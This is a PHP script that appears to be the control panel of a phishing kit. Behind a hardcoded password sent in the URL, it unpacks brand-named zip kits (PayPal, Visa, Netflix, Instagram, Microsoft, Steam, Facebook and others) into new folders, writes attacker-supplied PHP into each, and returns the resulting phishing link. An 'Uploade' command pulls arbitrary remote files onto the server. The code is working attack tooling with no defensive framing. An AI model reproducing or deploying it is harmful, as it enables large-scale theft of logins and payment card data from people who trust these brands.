<?php
header("Content-type: application/json; charset=utf-8");
$pass = '##Zaiem63728##';
if(!is_dir('CF')){
  mkdir('CF');
  file_put_contents("CF/.htaccess","Deny from all");
}

if($_GET['Pass'] == $pass){
  @$command = $_GET['Command'];
  @$url = $_GET['Url'] ?? "Null";
  @$file = $_GET['File'];
  @$script = $_GET['Script'];
  }
  if ($command == "skin") {
    $zipname = "CF/skin.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/skin/".$script); 
      $zip->close(); 
		}
	file_put_contents("skin/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/skin/'.$script];
  }
   if ($command == "uc") {
    $zipname = "CF/uc.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/uc/".$script); 
      $zip->close(); 
		}
	file_put_contents("uc/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/uc/'.$script];
	}
	 if ($command == "free") {
    $zipname = "CF/free.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/free/".$script); 
      $zip->close(); 
		}
	file_put_contents("free/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/free/'.$script];
	}
if ($command == "microsoft") {
    $zipname = "CF/microsoft.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/microsoft/".$script); 
      $zip->close(); 
		}
	file_put_contents("microsoft/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/microsoft/'.$script];
	}
	 if ($command == "insta") {
    $zipname = "CF/insta.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/insta/".$script); 
      $zip->close(); 
		}
	file_put_contents("insta/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/insta/'.$script];
	}
	 if ($command == "pes") {
    $zipname = "CF/pes.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/pes/".$script); 
      $zip->close(); 
		}
	file_put_contents("pes/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/pes/'.$script];
	}else if($command == 'Uploade'){
    file_put_contents("CF/".$script,file_get_contents($url));
    $print = ['ok'=>true];
  }
  if ($command == "spin") {
    $zipname = "CF/spin.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/spin/".$script); 
      $zip->close(); 
		}
		file_put_contents("spin/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/spin/'.$script];
  }
  if ($command == "in2") {
    $zipname = "CF/in2.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/in2/".$script); 
      $zip->close(); 
		}
		file_put_contents("in2/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/in2/'.$script];
  }
    if ($command == "PayPal") {
    $zipname = "CF/PayPal.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/PayPal/".$script); 
      $zip->close(); 
		}
		file_put_contents("PayPal/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/PayPal/'.$script];
  }
  if ($command == "Ledo") {
    $zipname = "CF/Ledo.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/Ledo/".$script); 
      $zip->close(); 
		}
		file_put_contents("Ledo/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/Ledo/'.$script];
  }
    if ($command == "tik") {
    $zipname = "CF/tik.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/tik/".$script); 
      $zip->close(); 
		}
		file_put_contents("tik/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/tik/'.$script];
  }
      if ($command == "visa") {
    $zipname = "CF/visa.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/visa/".$script); 
      $zip->close(); 
		}
		file_put_contents("visa/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/visa/'.$script];
  }
      if ($command == "netflix") {
    $zipname = "CF/netflix.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/netflix/".$script); 
      $zip->close(); 
		}
		file_put_contents("netflix/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/netflix/'.$script];
  }
        if ($command == "xnxx") {
    $zipname = "CF/xnxx.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/xnxx/".$script); 
      $zip->close(); 
		}
		file_put_contents("xnxx/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/xnxx/'.$script];
  }
    if ($command == "in3") {
    $zipname = "CF/in3.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/in3/".$script); 
      $zip->close(); 
		}
		file_put_contents("in3/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/in3/'.$script];
  }
    if ($command == "in4") {
    $zipname = "CF/in4.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/in4/".$script); 
      $zip->close(); 
		}
		file_put_contents("in4/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/in4/'.$script];
  }
      if ($command == "playstation") {
    $zipname = "CF/playstation.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/playstation/".$script); 
      $zip->close(); 
		}
		file_put_contents("playstation/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/playstation/'.$script];
  }
      if ($command == "steam") {
    $zipname = "CF/steam.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/steam/".$script); 
      $zip->close(); 
		}
		file_put_contents("steam/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/steam/'.$script];
  }
      if ($command == "SCRIPT") {
    $zipname = "CF/SCRIPT.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/SCRIPT/".$script); 
      $zip->close(); 
		}
		file_put_contents("SCRIPT/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/SCRIPT/'.$script];
  }
      if ($command == "Xnx") {
    $zipname = "CF/Xnx.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/Xnx/".$script); 
      $zip->close(); 
		}
		file_put_contents("Xnx/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/Xnx/'.$script];
  }
      if ($command == "Twitter") {
    $zipname = "CF/Twitter.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/Twitter/".$script); 
      $zip->close(); 
		}
		file_put_contents("Twitter/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/Twitter/'.$script];
  }
      if ($command == "bp") {
    $zipname = "CF/bp.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/bp/".$script); 
      $zip->close(); 
		}
		file_put_contents("bp/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/bp/'.$script];
  }
  if ($command == "visa2") {
    $zipname = "CF/visa2.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/visa2/".$script); 
      $zip->close(); 
		}
		file_put_contents("visa2/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/visa2/'.$script];
  }
  if ($command == "xnxxgold3") {
    $zipname = "CF/xnxxgold3.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/xnxxgold3/".$script); 
      $zip->close(); 
		}
		file_put_contents("xnxxgold3/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/xnxxgold3/'.$script];
  }
  if ($command == "xnxx") {
    $zipname = "CF/xnxx.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/xnxx/".$script); 
      $zip->close(); 
		}
		file_put_contents("xnxx/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/xnxx/'.$script];
  }
    if ($command == "ebay") {
    $zipname = "CF/ebay.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/ebay/".$script); 
      $zip->close(); 
		}
		file_put_contents("ebay/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/ebay/'.$script];
  }
  if ($command == "google") {
    $zipname = "CF/google.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/google/".$script); 
      $zip->close(); 
		}
		file_put_contents("google/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/google/'.$script];
  }
  if ($command == "snap") {
    $zipname = "CF/snap.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/snap/".$script); 
      $zip->close(); 
		}
		file_put_contents("snap/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/snap/'.$script];
  }
  if ($command == "yahoo") {
    $zipname = "CF/yahoo.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/yahoo/".$script); 
      $zip->close(); 
		}
		file_put_contents("yahoo/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/yahoo/'.$script];
  }
  if ($command == "face") {
    $zipname = "CF/face.zip";
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/face/".$script); 
      $zip->close(); 
		}
		file_put_contents("face/$script/.tokin.php",$file);
	$print = ['ok'=>true,'url'=>'https://'.$_SERVER['SERVER_NAME'].'/face/'.$script];
  }
  echo json_encode($print,128|256);
?>
